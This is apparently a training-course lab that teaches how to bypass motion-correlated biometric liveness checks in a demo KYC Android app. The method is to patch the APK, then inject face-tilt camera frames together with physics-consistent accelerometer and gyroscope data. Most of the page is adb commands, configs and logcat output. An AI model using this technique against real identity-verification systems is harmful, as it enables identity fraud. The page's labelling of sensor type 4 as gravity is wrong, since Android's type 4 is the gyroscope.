---
title: "Lab 5: Sensor Injection"
description: "Defeat motion-correlated liveness by injecting physics-consistent sensor data matched to camera frames"
---

> **Prerequisites:** Labs 2-3 (First Injection + Camera Injection) complete, Chapter 9 (Sensor Injection) read.
>
> **Estimated time:** 45 minutes.
>
> **Target:** `target-kyc-basic.apk` (package `com.poc.biometric`)

This is the hardest single-target lab in the course. The difficulty is not in the tooling -- you already know how to patch, push, and monitor. The difficulty is in the physics. You must inject camera frames showing a face tilting left while simultaneously injecting accelerometer and gyroscope data that describe the same tilt. If the visual motion and the sensor motion disagree, the liveness check fails.

The target application has a SensorActivity that performs motion-correlated liveness. It cross-checks what the camera sees against what the accelerometer and gyroscope report. A face rotating in the camera feed must be accompanied by corresponding device rotation in the sensor stream. This lab teaches you how to build that correlation from first principles.

---

## Step 1: Understand the Threat Model

The app's liveness engine performs three cross-correlation checks:

| Camera Signal | Sensor Signal | Correlation |
|--------------|---------------|-------------|
| Visual tilt of face in frame | Accelerometer X-axis shift | Gravity redistribution as device tilts |
| Rate of visual rotation | Gyroscope Z-axis value | Angular velocity during tilt |
| Gravity magnitude | sqrt(accelX^2 + accelY^2 + accelZ^2) | Must approximate 9.81 m/s^2 at all times |

If you push camera frames showing the face tilting left but the accelerometer reports zero X-axis change, the engine flags a mismatch. If the gyroscope reports zero angular velocity while the visual rotation is happening, that is a second flag. If the accelerometer values produce a gravity magnitude far from 9.81 m/s^2, the readings are physically impossible -- a third flag.

You need all three to be consistent.

---

## Step 2: Prepare Camera Frames

You need a sequence of frames showing a face gradually tilting to the left. This is the visual component that the liveness engine will analyze.

If you have a video of a face tilting left, extract frames:

```bash
mkdir -p /tmp/face_tilt_left
ffmpeg -i tilt_left_video.mp4 -vf "fps=15,scale=640:480" /tmp/face_tilt_left/%03d.png
```

If you do not have a video, you can generate test frames. For the sensor correlation to be tested, the app needs to detect a face and observe visual rotation. Solid-color frames will verify the injection pipeline but will not pass the actual liveness check. For a complete pass, use real face imagery.

Frame requirements:

| Requirement | Value | Notes |
|-------------|-------|-------|
| Resolution | 640x480 | Matches target camera config |
| Format | PNG | Numbered sequentially: 001.png, 002.png, ... |
| Frame count | 15-30 frames | 1-2 seconds at 15fps |
| Content | Face gradually tilting left | Start neutral, end tilted ~18 degrees |
| Face size | 30%+ of frame area | Smaller faces fail detection |
| Lighting | Even, no harsh shadows | Uneven lighting causes quality rejection |

Push the frames to the device:

```bash
adb shell mkdir -p /sdcard/poc_frames/
adb push /tmp/face_tilt_left/ /sdcard/poc_frames/
```

---

## Step 3: Build the Sensor Config -- The Physics

This is the core of the lab. You need to configure accelerometer and gyroscope values that describe a device tilted approximately 18 degrees to the left, with a slow counterclockwise rotation in progress.

### The Accelerometer: Gravity Redistribution

When a phone is held upright (portrait) and tilted to the left, gravity redistributes from the Z-axis to the X-axis. The key insight: the total gravity magnitude must remain approximately 9.81 m/s^2 regardless of orientation. This is Earth's gravitational acceleration -- it does not change when you tilt the phone.

For an 18-degree tilt to the left:

```text
accelX = g * sin(18 degrees) = 9.81 * 0.309 = 3.03 --> round to 3.0
accelY = 0.0    (no forward/backward tilt)
accelZ = g * cos(18 degrees) = 9.81 * 0.951 = 9.33 --> round to 9.31
```

Verify the gravity magnitude:

```text
magnitude = sqrt(3.0^2 + 0.0^2 + 9.31^2)
         = sqrt(9.0 + 0.0 + 86.68)
         = sqrt(95.68)
         = 9.78 m/s^2
```

The result, 9.78, is within the typical tolerance window of 9.5-10.0 m/s^2 that liveness SDKs accept. The slight deviation from 9.81 is expected -- real MEMS accelerometers have calibration offsets and environmental noise that cause similar drift.

### The Gyroscope: Angular Velocity During Tilt

The gyroscope reports angular velocity -- how fast the device is rotating, not its current angle. A leftward tilt is a counterclockwise rotation around the Z-axis (from the device's perspective).

For a slow, deliberate tilt:

```text
gyroZ = -0.15 rad/s  (counterclockwise rotation around Z)
gyroX = 0.0          (no pitch rotation)
gyroY = 0.0          (no yaw rotation)
```

The magnitude of -0.15 rad/s corresponds to roughly 8.6 degrees per second. Over a 2-second tilt sequence, that accumulates to about 17 degrees of rotation -- closely matching the 18-degree visual tilt in the camera frames.

### Jitter: Simulating Real Hardware Noise

Real sensors never produce perfectly stable readings. A jitter value of 0.1 adds Gaussian noise of +/-0.1 to each axis on every delivery. This turns a suspiciously clean (3.0, 0.0, 9.31) into a natural-looking (3.08, -0.04, 9.27) then (2.93, 0.07, 9.35) stream.

### The Complete Config

```bash
cat > /tmp/tilt_left_sensor.json << 'EOF'
{
  "accelX": 3.0,
  "accelY": 0.0,
  "accelZ": 9.31,
  "gyroX": 0.0,
  "gyroY": 0.0,
  "gyroZ": -0.15,
  "magX": 0.0,
  "magY": 25.0,
  "magZ": -45.0,
  "jitter": 0.1,
  "proximity": 5.0,
  "light": 300.0
}
EOF
```

Field-by-field rationale:

| Field | Value | Why |
|-------|-------|-----|
| `accelX` | 3.0 | Gravity pulling left -- sin(18 deg) component |
| `accelY` | 0.0 | No forward/backward tilt |
| `accelZ` | 9.31 | Remaining gravity -- cos(18 deg) component |
| `gyroZ` | -0.15 | Counterclockwise rotation at ~8.6 deg/s |
| `gyroX`, `gyroY` | 0.0 | No pitch or yaw rotation |
| `magX/Y/Z` | 0, 25, -45 | Standard magnetic field (derived sensors need this) |
| `jitter` | 0.1 | Moderate noise -- enough to look real, not enough to break correlation |
| `proximity` | 5.0 | Phone held at arm's length (cm) |
| `light` | 300.0 | Normal indoor lighting (lux) |

### Gravity Magnitude Calculator

Use this one-liner to verify any accelerometer configuration:

```bash
python3 -c "import math; x,y,z = 3.0, 0.0, 9.31; print(f'magnitude = {math.sqrt(x**2+y**2+z**2):.2f} m/s^2')"
```

Expected output: `magnitude = 9.78 m/s^2`

If the magnitude is outside the 9.5-10.0 range, adjust accelZ. The formula: `accelZ = sqrt(9.81^2 - accelX^2 - accelY^2)`.

```bash
python3 -c "import math; x,y = 3.0, 0.0; print(f'accelZ = {math.sqrt(9.81**2 - x**2 - y**2):.2f}')"
```

---

## Step 4: Patch and Install

Patch the APK. You need both camera and sensor hooks to be active:

```bash
cd /Users/josejames/Documents/android-red-team
java -jar patch-tool.jar course-1/targets/target-kyc-basic.apk \
  --out patched-sensor.apk \
  --work-dir ./work-sensor 2>&1 | tee patch_sensor_output.txt
```

Verify the patch output confirms both subsystems:

- **Camera hooks:** `toBitmap`, `analyze`, `onCaptureSuccess` (at least one)
- **Sensor hooks:** `onSensorChanged` or `SensorEventListener` references

If you already patched this APK in a previous lab, the same patched APK works -- all three subsystems (camera, location, sensor) are injected every time. You do not need to patch separately for each subsystem.

Install and grant permissions:

```bash
adb uninstall com.poc.biometric 2>/dev/null
adb install -r patched-sensor.apk

adb shell pm grant com.poc.biometric android.permission.CAMERA
adb shell pm grant com.poc.biometric android.permission.ACCESS_FINE_LOCATION
adb shell pm grant com.poc.biometric android.permission.ACCESS_COARSE_LOCATION
adb shell pm grant com.poc.biometric android.permission.READ_EXTERNAL_STORAGE
adb shell pm grant com.poc.biometric android.permission.WRITE_EXTERNAL_STORAGE
adb shell appops set com.poc.biometric MANAGE_EXTERNAL_STORAGE allow
```

---

## Step 5: Push Both Payloads

This is the critical step. Both camera frames and the sensor config must be present on the device before you launch the app. The cross-correlation check evaluates them together -- if only one subsystem is active, the mismatch causes immediate failure.

```bash
# Camera frames
adb shell mkdir -p /sdcard/poc_frames/
adb push /tmp/face_tilt_left/ /sdcard/poc_frames/

# Sensor config
adb shell mkdir -p /sdcard/poc_sensor/
adb push /tmp/tilt_left_sensor.json /sdcard/poc_sensor/config.json
```

Verify both payload directories have content:

```bash
adb shell ls /sdcard/poc_frames/
adb shell ls /sdcard/poc_sensor/
```

You should see PNG files in `poc_frames/` and `config.json` in `poc_sensor/`.

---

## Step 6: Launch and Monitor Both Subsystems

Start logcat monitoring for both FrameInterceptor and SensorInterceptor simultaneously:

**Terminal 1 -- Monitor:**

```bash
adb logcat -c
adb logcat -s FrameInterceptor,SensorInterceptor
```

**Terminal 2 -- Launch:**

```bash
adb shell am start -n com.poc.biometric/com.poc.biometric.ui.LauncherActivity
```

Navigate to the liveness verification step in the app.

---

## Step 7: Watch Interleaved Delivery Events

With both subsystems active, logcat shows interleaved camera and sensor events:

```text
D FrameInterceptor:  Auto-enabled — 20 frames loaded from /sdcard/poc_frames/face_tilt_left
D SensorInterceptor: Auto-enabled — config loaded from /sdcard/poc_sensor/config.json
D FrameInterceptor:  FRAME_DELIVERED idx=0 folder=face_tilt_left
D SensorInterceptor: SENSOR_DELIVERED type=1 values=[3.08, -0.04, 9.27]
D FrameInterceptor:  FRAME_DELIVERED idx=1 folder=face_tilt_left
D SensorInterceptor: SENSOR_DELIVERED type=1 values=[2.93, 0.07, 9.35]
D SensorInterceptor: SENSOR_DELIVERED type=4 values=[3.01, -0.02, 9.30]
D FrameInterceptor:  FRAME_CONSUMED toBitmap
D SensorInterceptor: SENSOR_DELIVERED type=1 values=[3.11, 0.02, 9.28]
D FrameInterceptor:  FRAME_DELIVERED idx=2 folder=face_tilt_left
```

Key observations:

| Event | What It Tells You |
|-------|-------------------|
| `FRAME_DELIVERED idx=N` | Camera frame N was injected into the pipeline |
| `SENSOR_DELIVERED type=1` | Accelerometer event delivered (type 1 = TYPE_ACCELEROMETER) |
| `SENSOR_DELIVERED type=4` | Gravity sensor event delivered (type 4 = TYPE_GRAVITY, computed automatically) |
| `FRAME_CONSUMED toBitmap` | The app called `toBitmap()` on the injected frame -- it is processing the image |

Notice the sensor values vary between deliveries (3.08 vs 2.93 vs 3.11 on accelX). That is the jitter producing realistic noise. The gravity sensor (type 4) values closely track the accelerometer values, confirming the cross-sensor consistency model is computing derived sensors correctly.

The interleaving pattern confirms that camera and sensor data are being delivered concurrently. The liveness engine receives a visual frame showing a tilted face at the same time it receives accelerometer data showing the corresponding tilt. The correlation passes.

---

## Step 8: Capture Evidence

Take a screenshot of the liveness check passing:

```bash
adb exec-out screencap -p > liveness_pass.png
```

Dump the combined delivery log:

```bash
adb logcat -d -s FrameInterceptor,SensorInterceptor > liveness_log.txt
```

Save a copy of your sensor config:

```bash
cp /tmp/tilt_left_sensor.json ./tilt_left_sensor.json
```

---

## Troubleshooting

### Sensor Mismatch

**Symptom:** Liveness check fails with "inconsistent motion" or similar.

**Cause:** The sensor values do not match the visual motion in the camera frames. For example, frames show a leftward tilt but accelX is 0 (no lateral gravity component).

**Fix:** Ensure your accelX value is positive for a left tilt (gravity pulling toward the left side of the device). Ensure gyroZ is negative for counterclockwise rotation. Re-read the physics section above.

### No Face Detected

**Symptom:** The app reports "no face found" or the liveness step does not begin.

**Cause:** The injected camera frames do not contain a detectable face, or the face is too small in the frame.

**Fix:** Ensure your face frames have a face occupying at least 30% of the frame area. Check lighting -- even illumination works best. If using test frames (solid colors), they will not pass face detection.

### Insufficient Movement

**Symptom:** The app says "please tilt your head" despite frames showing a tilt.

**Cause:** The visual tilt in your frames may be too subtle, or the gyroscope values are too low to register as movement.

**Fix:** Ensure your frames show a clear, progressive tilt from neutral to ~18 degrees. Increase gyroZ magnitude to -0.2 if -0.15 is not registering. Some SDKs require a minimum rotation threshold.

### Gravity Magnitude Out of Range

**Symptom:** Sensor data is rejected as "impossible" or liveness fails silently.

**Cause:** Your accelerometer values produce a gravity magnitude outside the acceptable range.

**Fix:** Run the gravity calculator:

```bash
python3 -c "import math; x,y,z = 3.0, 0.0, 9.31; print(f'{math.sqrt(x**2+y**2+z**2):.2f}')"
```

The result must be between 9.5 and 10.0. If it is not, adjust accelZ using:

```bash
python3 -c "import math; x,y = 3.0, 0.0; print(f'{math.sqrt(9.81**2 - x**2 - y**2):.2f}')"
```

### No SENSOR_DELIVERED Events

**Symptom:** FrameInterceptor logs appear but SensorInterceptor is silent.

**Cause:** The app may not register a `SensorEventListener` until a specific screen. Some apps only start sensor monitoring when the liveness challenge begins.

**Fix:** Navigate to the active liveness step in the app before checking logcat. If there are still no events, verify that your recon found `onSensorChanged` in the app's smali. If the app does not use sensors, there is nothing to hook.

---

## Self-Check Script

```bash
#!/bin/bash
echo "=== Lab 5: Sensor Injection — Self-Check ==="
PASS=0
FAIL=0

# Check sensor config
if [ -f tilt_left_sensor.json ]; then
  echo "[PASS] tilt_left_sensor.json exists"
  ((PASS++))
else
  echo "[FAIL] tilt_left_sensor.json not found"
  ((FAIL++))
fi

# Validate gravity magnitude
if [ -f tilt_left_sensor.json ]; then
  MAG=$(python3 -c "
import json, math
with open('tilt_left_sensor.json') as f:
    c = json.load(f)
print(f'{math.sqrt(c[\"accelX\"]**2 + c[\"accelY\"]**2 + c[\"accelZ\"]**2):.2f}')
" 2>/dev/null)
  if [ -n "$MAG" ]; then
    IN_RANGE=$(python3 -c "print('yes' if 9.5 <= float('$MAG') <= 10.0 else 'no')")
    if [ "$IN_RANGE" = "yes" ]; then
      echo "[PASS] Gravity magnitude = ${MAG} m/s^2 (within 9.5-10.0 range)"
      ((PASS++))
    else
      echo "[FAIL] Gravity magnitude = ${MAG} m/s^2 (outside 9.5-10.0 range)"
      ((FAIL++))
    fi
  else
    echo "[FAIL] Could not parse sensor config"
    ((FAIL++))
  fi
else
  echo "[FAIL] Cannot validate gravity — sensor config missing"
  ((FAIL++))
fi

# Check screenshot
if [ -f liveness_pass.png ]; then
  echo "[PASS] liveness_pass.png exists"
  ((PASS++))
else
  echo "[FAIL] liveness_pass.png not found"
  ((FAIL++))
fi

# Check delivery log has both subsystems
if [ -f liveness_log.txt ]; then
  FRAMES=$(grep -c "FRAME_DELIVERED" liveness_log.txt 2>/dev/null || echo 0)
  SENSORS=$(grep -c "SENSOR_DELIVERED" liveness_log.txt 2>/dev/null || echo 0)

  if [ "$FRAMES" -gt 0 ]; then
    echo "[PASS] liveness_log.txt has $FRAMES FRAME_DELIVERED events"
    ((PASS++))
  else
    echo "[FAIL] No FRAME_DELIVERED events in liveness_log.txt"
    ((FAIL++))
  fi

  if [ "$SENSORS" -gt 0 ]; then
    echo "[PASS] liveness_log.txt has $SENSORS SENSOR_DELIVERED events"
    ((PASS++))
  else
    echo "[FAIL] No SENSOR_DELIVERED events in liveness_log.txt"
    ((FAIL++))
  fi
else
  echo "[FAIL] liveness_log.txt not found"
  ((FAIL++))
  echo "[FAIL] (skipped sensor event check)"
  ((FAIL++))
fi

echo ""
echo "Results: $PASS passed, $FAIL failed out of $((PASS + FAIL)) checks"
[ "$FAIL" -eq 0 ] && echo "Lab 5 COMPLETE." || echo "Lab 5 INCOMPLETE — review failed checks."
```

---

## Why This Is the Hardest Lab

Labs 3 and 4 each exercise a single injection subsystem. Camera injection stands alone -- push frames, the app processes them. Location spoofing stands alone -- push coordinates, the geofence check passes. Neither requires coordination with another subsystem.

This lab requires two subsystems to tell the same story at the same time. The physics must be internally consistent (gravity magnitude), cross-consistent (accelerometer matches gyroscope), and externally consistent (sensor data matches visual data). Getting any one of these wrong triggers a mismatch detection.

In a real engagement, the timing adds another layer of difficulty. Active liveness challenges are time-bounded -- you have a few seconds to complete the requested action. Your frames must show the motion, your sensors must confirm it, and both must be active before the timeout expires. The hot-reload capability of the config files helps, but the coordination still requires planning.

This is also why sensor injection is the technique that most attackers skip. Camera injection alone passes many targets. Adding location spoofing extends coverage to geofenced flows. But defeating motion-correlated liveness requires understanding the physics, building matched payload pairs, and validating the math before deployment. The payoff is access to the most hardened verification flows -- the ones that explicitly defend against camera-only attacks.

---

## Deliverables

| File | Description |
|------|-------------|
| `tilt_left_sensor.json` | Sensor config with physics-consistent values for left tilt |
| `liveness_pass.png` | Screenshot of motion-correlated liveness check passing |
| `liveness_log.txt` | Logcat output showing interleaved FRAME_DELIVERED and SENSOR_DELIVERED events |

---

## Success Criteria

- [ ] Threat model understood: three cross-correlation checks identified
- [ ] Camera frames prepared showing gradual left tilt (15-30 frames, 640x480)
- [ ] Sensor config built with correct physics (accelX=3.0, accelZ=9.31, gyroZ=-0.15)
- [ ] Gravity magnitude validated: sqrt(3.0^2 + 0.0^2 + 9.31^2) = 9.78 (within 9.5-10.0)
- [ ] Patch output confirms both camera hooks and sensor hooks
- [ ] Both payload directories populated before launch (poc_frames/ and poc_sensor/)
- [ ] Logcat shows interleaved FRAME_DELIVERED and SENSOR_DELIVERED events
- [ ] Jittered sensor values visible in logcat (values vary between deliveries)
- [ ] Liveness check passes (screenshot captured)
- [ ] All three deliverables saved
